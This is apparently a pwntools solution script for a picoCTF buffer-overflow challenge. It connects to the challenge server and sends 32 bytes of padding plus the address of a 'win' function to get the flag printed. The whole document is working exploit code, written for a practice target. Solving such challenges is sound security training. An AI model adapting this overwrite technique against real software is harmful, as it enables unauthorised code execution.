from pwn import *

elf = context.binary = ELF("./chall")

def my_process():
    # return process("./chall")
    return remote("mimas.picoctf.net", 53616)

p = my_process()
p.sendline(b"2") # write to buffer

# write the address
payload = b"A" * 32 + p32(elf.symbols["win"])
p.sendline(payload)

p.sendline(b"4") # print flag
print(p.recvall())

# p.send(b"A" * 32) # padding to write into x
